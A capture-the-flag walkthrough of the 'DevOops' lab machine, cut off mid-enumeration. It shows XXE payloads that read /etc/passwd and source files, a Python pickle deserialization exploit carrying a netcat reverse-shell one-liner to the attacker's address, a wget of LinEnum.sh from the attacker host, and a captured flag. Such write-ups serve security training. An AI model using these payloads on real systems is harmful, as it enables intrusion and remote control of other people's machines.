#### DevOops

- [Attacker Info](#attacker-info)
- [Nmap Scan](#nmap-scan)
- [Web Enumeration](#web-enumeration)
- [Gained user shell via XXE](#gained-user-shell-via-xxe)
- [Root shell](#root-shell)
- [Reference](#reference)

###### Attacker Info

```sh
root@kali:~/devoops# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:7f:39:f2 brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.82/24 brd 10.0.0.255 scope global dynamic noprefixroute eth0
       valid_lft 604657sec preferred_lft 604657sec
    inet6 2601:5cc:c900:4024::b31c/128 scope global dynamic noprefixroute
       valid_lft 604660sec preferred_lft 604660sec
    inet6 2601:5cc:c900:4024:c176:4e8b:5ce0:5865/64 scope global temporary dynamic
       valid_lft 64438sec preferred_lft 64438sec
    inet6 2601:5cc:c900:4024:20c:29ff:fe7f:39f2/64 scope global dynamic mngtmpaddr noprefixroute
       valid_lft 64438sec preferred_lft 64438sec
    inet6 fe80::20c:29ff:fe7f:39f2/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    link/none
    inet 10.10.14.18/23 brd 10.10.15.255 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::1010/64 scope global
       valid_lft forever preferred_lft forever
    inet6 fe80::521c:4e6b:35a3:29ff/64 scope link stable-privacy
       valid_lft forever preferred_lft forever
root@kali:~/devoops#
```

###### Nmap Scan

```sh
root@kali:~/devoops# nmap -sC -sV -oA canape.nmap 10.10.10.91
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-13 17:12 EST
Nmap scan report for 10.10.10.91
Host is up (0.12s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.97 seconds
root@kali:~/devoops#
```

```
OpenSSH 7.2p2 launchpad
```

![](images/1.png)

![](images/2.png)

###### Web Enumeration

- [`Gunicorn`](https://gunicorn.org/)

```
http://10.10.10.91:5000/
http://10.10.10.91:5000/feed
```

![](images/3.png)

![](images/4.png)

```sh
root@kali:~/devoops# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.91:5000 -t 50

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.91:5000/
[+] Threads      : 50
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2018/11/13 18:25:45 Starting gobuster
=====================================================
/upload (Status: 200)
/feed (Status: 200)
```

```
http://10.10.10.91:5000/upload
```

###### Gained user shell via XXE 

```sh
root@kali:~/devoops# echo "Sample file" > text.txt
root@kali:~/devoops# cat text.txt
Sample file
root@kali:~/devoops#
```

```
XML elements: Author, Subject, Content
```

![](images/5.png)

- [`PayloadsAllTheThings - Classic XXE - etc passwd.xml`](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20injection/Files/Classic%20XXE%20-%20etc%20passwd.xml)

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<Root>
<Author>&file;</Author>
<Subject>Random1</Subject>
<Content>Random2</Content>
</Root>
```

![](images/6.png)

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (ANY)>
<!ENTITY file SYSTEM "feed.py">
]>
<Root>
<Author>&file;</Author>
<Subject>Random1</Subject>
<Content>Random2</Content>
</Root>
```

![](images/7.png)

![](images/8.png)

```python
@app.route("/newpost", methods=["POST"])
def newpost():
  # TODO: proper save to database, this is for testing purposes right now
  picklestr = base64.urlsafe_b64decode(request.data)
#  return picklestr
  postObj = pickle.loads(picklestr)
  return "POST RECEIVED: " + postObj['Subject']
```

![](images/9.png)

- [`Reverse Shell Cheat Sheet`](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

`pickel-exploit.py`

```python
import pickle
from base64 import urlsafe_b64encode as b64encode

RUNME = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 9001 >/tmp/f"""

class randomMethod(object):
	def __reduce__(self):
		import os
		return (os.system,(RUNME,))

print b64encode(pickle.dumps(randomMethod()))
```

```sh
root@kali:~/devoops# python pickel-exploit.py
Y3Bvc2l4CnN5c3RlbQpwMAooUydybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC4xOCA5MDAxID4vdG1wL2YnCnAxCnRwMgpScDMKLg==
root@kali:~/devoops#
```

```
POST /newpost HTTP/1.1
Host: 10.10.10.91:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.91:5000/upload
Content-Type: text
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 152

Y3Bvc2l4CnN5c3RlbQpwMAooUydybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC4xOCA5MDAxID4vdG1wL2YnCnAxCnRwMgpScDMKLg==
```

![](images/10.png)

- [`Upgrading simple shells to fully interactive TTYs`](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

```sh
root@kali:~/devoops# ncat -nlvp 9001
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.91.
Ncat: Connection from 10.10.10.91:33078.
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
roosa@gitter:~/deploy/src$ ^Z
[1]+  Stopped                 ncat -nlvp 9001
root@kali:~/devoops# echo $TERM
xterm-256color
root@kali:~/devoops# stty -a
speed 38400 baud; rows 51; columns 204; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = M-^?; eol2 = M-^?; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc ixany imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
root@kali:~/devoops# stty raw -echo
root@kali:~/devoops# ncat -nlvp 9001
                                    reset
reset: unknown terminal type unknown
Terminal type? xterm-256color

roosa@gitter:~/deploy/src$ stty rows 51 columns 204
roosa@gitter:~/deploy/src$ export SHELL=bash
roosa@gitter:~/deploy/src$ id
uid=1002(roosa) gid=1002(roosa) groups=1002(roosa),4(adm),27(sudo)
roosa@gitter:~/deploy/src$
```

```sh
roosa@gitter:~/deploy/src$ ls -lah
total 49M
drwxrwx--- 2 roosa roosa 4.0K Nov 13 17:29 .
drwxrwxr-x 4 roosa roosa 4.0K Mar 26  2018 ..
-rw-rw-r-- 1 roosa roosa  31M Nov 13 18:36 access.log
-r--r--r-- 1 roosa roosa 1.6K Mar 26  2018 app.py
-rw-rw-r-- 1 roosa roosa 1.6K Mar 26  2018 app.py~
-r--r--r-- 1 roosa roosa   11 Mar 26  2018 config.py
-rw-rw-r-- 1 roosa roosa 534K Mar 26  2018 devsolita-snapshot.png
-rw-rw-r-- 1 roosa roosa  18M Nov 13 18:36 feed.log
-r--r--r-- 1 roosa roosa 3.5K Mar 26  2018 feed.py
-rw-rw-r-- 1 roosa roosa 4.5K Mar 26  2018 feed.pyc
-rw-rw-r-- 1 roosa roosa 1.0K Mar 26  2018 .feed.py.swp
-rw-rw-r-- 1 roosa roosa  302 Mar 26  2018 index.html
-rw-rw-r-- 1 roosa roosa   27 Mar 26  2018 save.p
-rw-rw-r-- 1 roosa roosa  200 Nov 13 17:33 text.xml
-rw-rw-r-- 1 roosa roosa  362 Mar 26  2018 upload.html
roosa@gitter:~/deploy/src$ cd
roosa@gitter:~$ ls -l
total 68
drwxrwxr-x 4 roosa roosa 4096 Mar 26  2018 deploy
drwxr-xr-x 2 roosa roosa 4096 May 29 10:44 Desktop
drwxr-xr-x 2 roosa roosa 4096 Mar 21  2018 Documents
drwxr-xr-x 2 roosa roosa 4096 Mar 21  2018 Downloads
-rw-r--r-- 1 roosa roosa 8980 Mar 19  2018 examples.desktop
drwxr-xr-x 2 roosa roosa 4096 Mar 21  2018 Music
drwxr-xr-x 2 roosa roosa 4096 Mar 21  2018 Pictures
drwxr-xr-x 2 roosa roosa 4096 Mar 21  2018 Public
-rwxrw-r-- 1 roosa roosa  147 Mar 26  2018 run-blogfeed.sh
-rw-rw-r-- 1 roosa roosa 1839 Mar 26  2018 service.sh
-rw-rw-r-- 1 roosa roosa 2206 Mar 26  2018 service.sh~
drwxr-xr-x 2 roosa roosa 4096 Mar 21  2018 Templates
-r-------- 1 roosa roosa   33 Mar 26  2018 user.txt
drwxr-xr-x 2 roosa roosa 4096 Mar 21  2018 Videos
drwxrwxr-x 3 roosa roosa 4096 Mar 21  2018 work
roosa@gitter:~$ cat user.txt
c5808e1643e801d40f09ed87cdecc67b
roosa@gitter:~$
```

###### Root shell

```sh
root@kali:~/devoops# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.91 - - [13/Nov/2018 18:44:08] "GET /LinEnum.sh HTTP/1.1" 200 -
```

```sh
roosa@gitter:/tmp$ wget http://10.10.14.18/LinEnum.sh
--2018-11-13 18:43:02--  http://10.10.14.18/LinEnum.sh
Connecting to 10.10.14.18:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 47585 (46K) [text/x-sh]
Saving to: ‘LinEnum.sh’

LinEnum.sh                                         100%[================================================================================================================>]  46.47K  79.5KB/s    in 0.6s

2018-11-13 18:43:03 (79.5 KB/s) - ‘LinEnum.sh’ saved [47585/47585]

roosa@gitter:/tmp$
```

```sh
roosa@gitter:/tmp$ bash LinEnum.sh

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.93

[-] Debug Info
[+] Thorough tests = Disabled (SUID/GUID checks will not be perfomed!)


Scan started at:
Tue Nov 13 18:43:09 EST 2018


### SYSTEM ##############################################
[-] Kernel information:
Linux gitter 4.13.0-37-generic #42~16.04.1-Ubuntu SMP Wed Mar 7 16:02:25 UTC 2018 i686 athlon i686 GNU/Linux


[-] Kernel information (continued):
Linux version 4.13.0-37-generic (buildd@lcy01-amd64-019) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9)) #42~16.04.1-Ubuntu SMP Wed Mar 7 16:02:25 UTC 2018


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
NAME="Ubuntu"
VERSION="16.04.4 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.4 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial


[-] Hostname:
gitter


### USER/GROUP ##########################################
[-] Current user/group info:
uid=1002(roosa) gid=1002(roosa) groups=1002(roosa),4(adm),27(sudo)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest
root             pts/17   192.168.57.1     Mon Mar 26 06:23:48 -0400 2018
git              pts/4    127.0.0.1        Mon Mar 26 08:15:29 -0400 2018


[-] Who else is logged on:
 18:43:09 up 1 day, 16:45,  0 users,  load average: 0.00, 0.22, 0.39
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(messagebus) gid=110(messagebus) groups=110(messagebus)
uid=107(uuidd) gid=111(uuidd) groups=111(uuidd)
uid=108(lightdm) gid=114(lightdm) groups=114(lightdm)
uid=109(whoopsie) gid=117(whoopsie) groups=117(whoopsie)
uid=110(avahi-autoipd) gid=119(avahi-autoipd) groups=119(avahi-autoipd)
uid=111(avahi) gid=120(avahi) groups=120(avahi)
uid=112(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=113(colord) gid=123(colord) groups=123(colord)
uid=114(speech-dispatcher) gid=29(audio) groups=29(audio)
uid=115(hplip) gid=7(lp) groups=7(lp)
uid=116(kernoops) gid=65534(nogroup) groups=65534(nogroup)
uid=117(pulse) gid=124(pulse) groups=124(pulse),29(audio)
uid=118(rtkit) gid=126(rtkit) groups=126(rtkit)
uid=119(saned) gid=127(saned) groups=127(saned),122(scanner)
uid=120(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
uid=1001(git) gid=1001(git) groups=1001(git)
uid=1002(roosa) gid=1002(roosa) groups=1002(roosa),4(adm),27(sudo)
uid=121(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=1003(blogfeed) gid=1003(blogfeed) groups=1003(blogfeed)


[-] It looks like we have some admin users:
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
uid=1002(roosa) gid=1002(roosa) groups=1002(roosa),4(adm),27(sudo)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
osboxes:x:1000:1000:osboxes.org,,,:/home/osboxes:/bin/false
git:x:1001:1001:git,,,:/home/git:/bin/bash
roosa:x:1002:1002:,,,:/home/roosa:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
blogfeed:x:1003:1003:,,,:/home/blogfeed:/bin/false


[-] Super user account(s):
root


[-] Accounts that have recently used sudo:
/home/roosa/.sudo_as_admin_successful


[-] Are permissions on /home directories lax:
total 40K
drwxr-xr-x  7 root     root     4.0K Mar 19  2018 .
drwxr-xr-x 23 root     root     4.0K Mar 20  2018 ..
drwxr-xr-x  2 blogfeed blogfeed 4.0K Mar 19  2018 blogfeed
drwxr-xr-x  5 git      git      4.0K Mar 19  2018 git
drwx------  2 root     root      16K Aug  4  2017 lost+found
drwxr-xr-x 16 osboxes  osboxes  4.0K Mar 26  2018 osboxes
drwxr-xr-x 22 roosa    roosa    4.0K May 29 10:32 roosa


### ENVIRONMENTAL #######################################
[-] Environment information:
XDG_SESSION_ID=c2
SHELL=bash
USER=roosa
FLASK_APP=feed.py
MAIL=/var/mail/roosa
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
WERKZEUG_DEBUG_PIN=151237652
PWD=/tmp
LANG=en_US.UTF-8
SHLVL=3
HOME=/home/roosa
LOGNAME=roosa
SERVER_SOFTWARE=gunicorn/19.7.1
LESSOPEN=| /usr/bin/lesspipe %s
XDG_RUNTIME_DIR=/run/user/1002
LESSCLOSE=/usr/bin/lesspipe %s %s
_=/usr/bin/env


[-] Path information:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games


[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash


[-] Current umask value:
0002
u=rwx,g=rwx,o=rx


[-] umask value as specified in /etc/login.defs:
UMASK		022


[-] Password and storage information:
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab

/etc/cron.d:
total 28
drwxr-xr-x   2 root root  4096 Aug  1  2017 .
drwxr-xr-x 133 root root 12288 May 29 10:44 ..
-rw-r--r--   1 root root   244 Dec 28  2014 anacron
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder
-rw-r--r--   1 root root   189 Aug  4  2017 popularity-contest

/etc/cron.daily:
total 72
drwxr-xr-x   2 root root  4096 Mar 19  2018 .
drwxr-xr-x 133 root root 12288 May 29 10:44 ..
-rwxr-xr-x   1 root root   311 Dec 28  2014 0anacron
-rwxr-xr-x   1 root root   376 Mar 31  2016 apport
-rwxr-xr-x   1 root root  1474 Jun 19  2017 apt-compat
-rwxr-xr-x   1 root root   355 May 22  2012 bsdmainutils
-rwxr-xr-x   1 root root   384 Oct  5  2014 cracklib-runtime
-rwxr-xr-x   1 root root  1597 Nov 26  2015 dpkg
-rwxr-xr-x   1 root root   372 May  6  2015 logrotate
-rwxr-xr-x   1 root root  1293 Nov  6  2015 man-db
-rwxr-xr-x   1 root root   435 Nov 18  2014 mlocate
-rwxr-xr-x   1 root root   249 Nov 12  2015 passwd
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root  3449 Feb 26  2016 popularity-contest
-rwxr-xr-x   1 root root   214 May 24  2016 update-notifier-common
-rwxr-xr-x   1 root root  1046 May 19  2016 upstart

/etc/cron.hourly:
total 20
drwxr-xr-x   2 root root  4096 Aug  1  2017 .
drwxr-xr-x 133 root root 12288 May 29 10:44 ..
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 24
drwxr-xr-x   2 root root  4096 Aug  1  2017 .
drwxr-xr-x 133 root root 12288 May 29 10:44 ..
-rwxr-xr-x   1 root root   313 Dec 28  2014 0anacron
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 36
drwxr-xr-x   2 root root  4096 Mar 19  2018 .
drwxr-xr-x 133 root root 12288 May 29 10:44 ..
-rwxr-xr-x   1 root root   312 Dec 28  2014 0anacron
-rwxr-xr-x   1 root root    86 Apr 13  2016 fstrim
-rwxr-xr-x   1 root root   771 Nov  6  2015 man-db
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root   211 May 24  2016 update-notifier-common


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


[-] Anacron jobs and associated file permissions:
-rw-r--r-- 1 root root 401 Dec 28  2014 /etc/anacrontab
# /etc/anacrontab: configuration file for anacron

# See anacron(8) and anacrontab(5) for details.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
HOME=/root
LOGNAME=root

# These replace cron's entries
1	5	cron.daily	run-parts --report /etc/cron.daily
7	10	cron.weekly	run-parts --report /etc/cron.weekly
@monthly	15	cron.monthly	run-parts --report /etc/cron.monthly


[-] When were jobs last executed (/var/spool/anacron contents):
total 20
drwxr-xr-x 2 root root 4096 Aug  4  2017 .
drwxr-xr-x 7 root root 4096 Aug  1  2017 ..
-rw------- 1 root root    9 Nov 13 07:35 cron.daily
-rw------- 1 root root    9 Nov 12 02:12 cron.monthly
-rw------- 1 root root    9 Nov 12 02:07 cron.weekly


[-] Systemd timers:
NEXT                         LEFT        LAST                         PASSED        UNIT                         ACTIVATES
Wed 2018-11-14 01:47:05 EST  7h left     Tue 2018-11-13 14:25:42 EST  4h 18min ago  apt-daily.timer              apt-daily.service
Wed 2018-11-14 02:12:32 EST  7h left     Tue 2018-11-13 02:12:32 EST  16h ago       systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Wed 2018-11-14 06:32:12 EST  11h left    Tue 2018-11-13 06:24:51 EST  12h ago       apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2018-11-19 04:45:01 EST  5 days left Mon 2018-11-12 04:48:49 EST  1 day 13h ago snapd.refresh.timer          snapd.refresh.service

4 timers listed.
Enable thorough tests to see inactive timers


### NETWORKING  ##########################################
[-] Network and IP info:
ens33     Link encap:Ethernet  HWaddr 00:50:56:b4:c2:9f
          inet addr:10.10.10.91  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feb4:c29f/64 Scope:Link
          inet6 addr: dead:beef::250:56ff:feb4:c29f/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2136556 errors:25 dropped:133 overruns:0 frame:0
          TX packets:2063842 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:177590567 (177.5 MB)  TX bytes:269796970 (269.7 MB)
          Interrupt:19 Base address:0x2000

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:200 errors:0 dropped:0 overruns:0 frame:0
          TX packets:200 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:16148 (16.1 KB)  TX bytes:16148 (16.1 KB)


[-] ARP history:
? (10.10.10.92) at 00:50:56:b4:7a:d9 [ether] on ens33
? (10.10.10.2) at 00:50:56:b4:f5:b5 [ether] on ens33


[-] Nameserver(s):
nameserver 10.10.10.2


[-] Default route:
default         10.10.10.2      0.0.0.0         UG    0      0        0 ens33


[-] Listening TCP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      1274/python
tcp        0    116 10.10.10.91:33078       10.10.14.18:9001        ESTABLISHED 2410/nc
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 ::1:631                 :::*                    LISTEN      -


[-] Listening UDP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
udp        0      0 0.0.0.0:34875           0.0.0.0:*                           -
udp        0      0 0.0.0.0:631             0.0.0.0:*                           -
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -
udp        0      0 10.10.10.91:51016       10.10.10.2:53           ESTABLISHED -
udp6       0      0 :::46117                :::*                                -
udp6       0      0 :::5353                 :::*                                -


### SERVICES #############################################
[-] Running processes:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.4  23956  4952 ?        Ss   Nov12   0:06 /sbin/init splash
root         2  0.0  0.0      0     0 ?        S    Nov12   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        S<   Nov12   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        S<   Nov12   0:00 [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    Nov12   0:11 [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        S    Nov12   0:03 [rcu_sched]
root         9  0.0  0.0      0     0 ?        S    Nov12   0:00 [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    Nov12   0:00 [migration/0]
root        11  0.0  0.0      0     0 ?        S    Nov12   0:00 [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    Nov12   0:00 [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    Nov12   0:00 [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        S<   Nov12   0:00 [netns]
root        15  0.0  0.0      0     0 ?        S    Nov12   0:00 [khungtaskd]
root        16  0.0  0.0      0     0 ?        S    Nov12   0:00 [oom_reaper]
